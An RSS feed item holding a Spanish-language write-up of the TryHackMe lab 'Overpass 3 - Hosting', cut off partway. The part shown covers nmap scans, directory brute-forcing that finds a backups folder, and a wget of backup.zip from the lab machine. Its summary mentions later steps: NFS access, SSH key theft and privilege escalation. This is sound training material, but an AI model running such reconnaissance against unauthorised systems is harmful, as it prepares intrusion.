<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>nfs on sckull</title>
    <link>https://sckull.github.io/tags/nfs/</link>
    <description>Recent content in nfs on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Tue, 12 Jan 2021 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/nfs/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>TryHackMe - Overpass 3 - Hosting</title>
        <link>https://sckull.github.io/posts/overpass3/</link>
        <pubDate>Tue, 12 Jan 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 12 Jan 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/overpass3/</guid>
        <description>Overpass 3 - Hosting es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y enumeracion para obtener acceso y credenciales para acceder al siguiente usuario.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Overpass 3 - Hosting es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y enumeracion para obtener acceso y credenciales para acceder al siguiente usuario. Se obtuvo el puerto NFS localmente donde obtuvimos la clave privada para SSH de otro usuario. Finalmente escalamos privilegios con Bash.&lt;/p&gt;
&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/overpass3hosting&#34;&gt;Overpass 3 -  Hosting&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,AAABAAIAEBAAAAAAIAADAgAAJgAAABgYAAAAACAACQMAACkCAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAHKSURBVHicbdM9aFRBFAXgb142WRMTDbpCYlQMaKEIKoggiFYW1hFsBC1EtPAHxcZGBE0liEgKEREUIv5VFilELVT8RS1SCFokFtEoGokbQrIkz+LNxpdlbzPz3sw5995zzwTzIyBFC45gDyZwHbdXnSh1NncX37dVWjqOzWxNuxpKoVADhgW4iR7cxSJBv1TXku72t9PltKNSDkJra1hWak+THEF1vz+Cd2AvdgtO4dzw/e9ri5PFicmmWddGX6Uf/46EPEE12nEVz+aqmnVFYOxFuXGqOH5rYVNReWkIvRMDQ6EOQYLZ3AqN+Iaz6Ntwcs2ugkLpS9unRyF3cSfOY3EUMolrigLW4xee4HgkVMhlOY3NeBDBFTTFswoeoxkHJQb1uOCeeR08xZ3cd7324Ct6q+3WihiwDm8wihvYiHcYjm1W8uS1BLORfYVMsAPYjpdow2eZoHOR1IAbsRxDeI4/6EafTMDDMmfWrSDBFC5jGwbwE4O4FCsYQUO+gryV03jYjw/YhIcoYxoXZZM44//k5hHAFhyNgCmZrRswjtWy+a+MyYi9VI20TyZccwSFXKYkB/qBQ3iNpHbWnbKnPKO+DxL8xlj1xz8E3Hd7/fKRLgAAAABJRU5ErkJggolQTkcNChoKAAAADUlIRFIAAAAYAAAAGAgGAAAA4Hc9+AAAAtBJREFUeJyl1ktoXFUYB/DfvTOZMLZD2sRYA9G2BsVoRYRiLWYhSLELHxSJLoobXSioCIKgOwtCFhVduVBRUcGFCy2KKJRKwfiIhmKttUWkGF2YaE2TVKvJvFycM/ZmmEeqfzicc8+Z+/2/x/98dxJrw2bswTb8jU/wPs7BwJ0DpcGx4lS+0DNqIXVPMuLG3BZJb6/8Gozfj2cwlNl7GF/gIRwtXVPYmSvmrq7Wqy7pLdq5/irF/DrlcrkrwV68Etcf4GOUMI6bYhQ7Lqr1bk6Xckn1D+brZYd/nrNnx6hkJZV2ML4RE3H9BG7Hc9iHMXyEy/BU7c/0dG2Z9T8OqQ6WHah8a+rYjFy9LulAcBcO4Ai2o950vg3T+K00Vrh1eNfQofzFyXB1MVVdSPTni64Y3NgxgmW8gxdbGIcf8AsuPTu5UqsdLOyvLFVn1y0NGC6MmB8647NfT33eKYJuSPA9tmIEM5se6du6oa90d/p7oX+5dG7y1LHZQ60I+jCKXBeCAt4U1LUXJ/F1N6+uxHEhJRc6KngjEq8KM4sJPIl5nO7mTUQdqXAZC4J8pxqHzfdgQ5xfwtMZA7XoTJrZyxa+R7h41wkp/hfNBLU4VwQVEWrRjzOZvZ44ROJy5t1Vimsn00bqxvGVULxp3Bf39wsKOo7D0YGaFmhHsIyb8RZuwIe4Hq9jN04INdqCdzGrjeo6XbQHhRQewbORJMFjeBlz8XeVTnbaHeQxGNcH8RPei8/9cXwjpG1CaCUr7Qy1worQ83fjcczg0Xg2icvxmlDc7dGZljVoxguCCvYJcvs0Pp+I85dCazjqvFS/wyYhlXXsWksEOSzGCMZxLZ7H21jAA7gXfwnfizltitxM0JBnOc5n8WqL96bjyKKRolXdoZmgGuc7nC/yWpAKH5+scy1xm1Dg/9LsGvUYyBps1a5viWMtfwiyWBRqNHOB7/0//ANDttTfJpzqzAAAAABJRU5ErkJggg==&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;190&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/NinjaJc01&#34;&gt;NinjaJc01&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/NinjaJc01.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Jan 11 20:08:53 2021 as: nmap -p- --min-rate 1000 -o allPorts overpass.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; overpass.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.61.206&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.36s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Jan 11 20:11:05 2021 -- 1 IP address (1 host up) scanned in 132.11 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Jan 11 20:11:31 2021 as: nmap -p 21,22,80 -sV -sC -o servicePorts overpass.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; overpass.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.61.206&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.31s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.37 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;centos&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.37 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;centos&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Jan 11 20:11:48 2021 -- 1 IP address (1 host up) scanned in 17.54 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80 donde vemos una descripcion de la &amp;ldquo;empresa&amp;rdquo; y de algunos posibles usuarios.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210111_193806.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rustbuster&#34;&gt;RUSTBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/overpass3$ /opt/rustbuster/rustbuster dir -u http://overpass.thm/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;35&lt;/span&gt; -e php,html,txt
~ rustbuster v3.0.3 ~ by phra &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ps1dr3x ~

         _     _                 _         _           _        _                 _         _           _           _     
        /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;  
       /  &lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt; / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; 
      / /&lt;span class=&#34;se&#34;&gt;\ \ \ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;
     / / /&lt;span class=&#34;se&#34;&gt;\ \_\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    / / /_/ / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; /_/_ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / / /_/ / /
   / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / / / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / /&lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ /____/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / 
  / / /_____/ / / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / / /  &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_// / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  / / /_____/  
 / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /____&lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;/ / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /______ / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   
/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /__________/ / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /_______/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;  
&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_____________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;__________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;   


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at	: 2021-01-11 20:14:34

GET	&lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden			http://overpass.thm/.html
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://overpass.thm/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://overpass.thm/backups
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://overpass.thm/backups/
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://overpass.thm/cgi-bin/
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://overpass.thm/cgi-bin/.html
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://overpass.thm/index.html
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://overpass.thm/index.html
  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;00:02:33&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;########################################   18444/18444   ETA: 00:00:00 req/s: 120&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Ended at: 2021-01-11 20:17:08
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un directorio que contiene un archivo comprimido, este iñto,p tiene una clave y un archivo encriptado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/overpass3$ wget http://overpass.thm/backups/backup.zip
--2021-01-11 20:18:31--  http://overpass.thm/backups/backup.zip
Resolving overpass.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;overpass.thm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;... 10.10.61.206
Connecting to overpass.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;overpass.thm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;10.10.61.206&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;:80... connected.
HTTP request sent, awaiting response... &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
